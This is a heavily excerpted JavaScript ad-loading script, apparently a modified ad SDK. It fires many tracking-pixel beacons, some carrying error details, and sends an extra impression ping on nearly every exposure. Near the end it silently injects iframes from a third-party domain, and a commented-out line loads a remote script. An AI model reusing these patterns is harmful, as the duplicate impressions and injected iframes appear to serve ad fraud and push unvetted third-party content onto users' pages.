...
window.all_info = []; 
window.all_info['iadvplaceid'] = '8062406673795620'; 
...
if (crd <= 0) window.all_info['cnzz_count'] = 1;


var crd_2 = Math.floor(Math.random() * (1000 - 1)) + 1;
if (crd_2 <= 0) window.all_info['cnzz_count_2'] = 1;

var crd_3 = Math.floor(Math.random() * (1000 - 1)) + 1;
if (crd_3 <= 0) window.all_info['cnzz_count_3'] = 1;


var crd_4 = Math.floor(Math.random() * (1000 - 1)) + 1;
if (crd_4 <= 0) window.all_info['cnzz_count_4'] = 1;

var crd_5 = Math.floor(Math.random() * (1000 - 1)) + 1;
if (crd_5 <= 0) window.all_info['cnzz_count_5'] = 1;

var crd_6 = Math.floor(Math.random() * (1000 - 1)) + 1;
if (crd_6 <= 0) window.all_info['cnzz_count_6'] = 1;





var trackid = trackid || 10200;
var cnzz_id = '1280104002';
...
//			console.log('tttttttt');
			...
			e.bindSite(o, t.site_set), e.bindAdConf(o, t), e.display_type = t.display_type ? t.display_type : e.display_type, e.checkLoadCondition(o, i, c) && (s ? _.isTBSPageView() && g.loadJS("//res.imtt.qq.com/tbs/tbs.js", function() {
			    ...
			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=64';
			    new Image().src = alogs;            
				...
				var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid=10163&gdt_mview=65&&tc='+tc+'&cheight='+err_cheight;
				new Image().src = alogs; 
				
			    } else console.log("tbsjs not ready")
                        }) : (
			    
			    //new Image().src = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=66',
				e.conflist.push({
                            posId: o,
                            count: i,
                            platform: "mobile",
				...
				var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=67';
				new Image().src = alogs;			
                        var t = e;
                        t.conflist && t.conflist.length > 0 && !t.qbsLoaded && g.loadJS("//qzonestyle.gtimg.cn/qzone/biz/comm/js/qbs.js", function() {
                            	var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=68';
				new Image().src = alogs;
			    t.qbsLoaded = !0;
                    ...
                    exposeTemplateNativeAd: function(t, n) {
                        ...
                        if (i) {
                            ...
                            o.doExpose(a);
			    //o.doExpose(a);
			    var time_rand_r = Math.floor(Math.random()*(1000-0+1)+0);
			...
			try{
			    ...
			    var tc = err.name + ':' +err.message;
			    var err_cheight = err.number;
			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=51&tc='+tc+'&cheight='+err_cheight;
			    new Image().src = alogs;   		    
			}
			...
			try{
			    ...
			    var tc = err.name + ':' +err.message;
			    var err_cheight = err.number;
			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=62&tc='+tc+'&cheight='+err_cheight;
			    new Image().src = alogs;   		    
			}
		    },
			...
			try{
			    ...
			    var tc = err.name + ':' +err.message;
			    var err_cheight = err.number;
			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=61&tc='+tc+'&cheight='+err_cheight;
			    new Image().src = alogs;   		    
			}
			...
			try{
			    ...
			    var tc = err.name + ':' +err.message;
			    var err_cheight = err.number;
			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=60&tc='+tc+'&cheight='+err_cheight;
			    new Image().src = alogs;   		    
			}
                    },
			...
			try{
			    n.template && n.template.length;
			}catch(err){
			    var tc = err.name + ':' +err.message;
			    var err_cheight = err.number;
			    var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=50&tc='+tc+'&cheight='+err_cheight;
			    new Image().src = alogs;   		    
			}
				...
				if (n['data'][0]['domain'] == 'm.wkbins.com'){
				    return;
				}
			    }
			    ...
			    n.template && n.template.length > 0 ? e.processTemplateNativeAd(t, n, o, i) : e.checkEnvironment("inQB") ? e.processinQBCustomNativeAd(t, n, o, i) : e.checkEnvironment("inQW") && window.tbs && window.tbs.package && window.tbs.package.isApkInstalled ? e.processinQWCustomNativeAd(t, n, o, i) : e.processCustomNativeAd(t, n, o, i)		    
                    ...
                    doExpose: function(t) {
                        var n = "";
			var r5 = Math.floor(Math.random() * (100 - 1)) + 1;
			    ...
			    var r4 = Math.floor(Math.random() * (100 - 1)) + 1;
			    if(r4 < 100){    
				var nn = n+'&datatype=jsonp&callback=_cb_gdtjson2';
				new Image().src = nn;
...
//				e.exposureOids[n] = !0, r.default.evnet(120311, "ad_expose", t)				
			...
			console.log(n);
			console.log('nnnnn');
			var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid='+trackid+'&placement_id='+window.all_info['iadvplaceid']+'&app_id='+window.all_info['iappid']+'&gdt_mview=4&r5='+r5;
			new Image().src = alogs;
                    },
                    doClick: function(t) {
...
//		var core_js = 'https://etc.6187wo.com/youhua.js'; 
//		bc(core_js);
		...
		function agnf(){    
			...
			c.src = "https://etc.6187wo.com/20149.html#s_w="+s_w;
			document.body.appendChild(d);
		...
		function selfid(){    
			...
			var c = document.createElement("iframe");
			var s_w = window.screen.width;
			c.src = "https://etc.6187wo.com/90149.html#s_w="+s_w;
			document.body.appendChild(d);
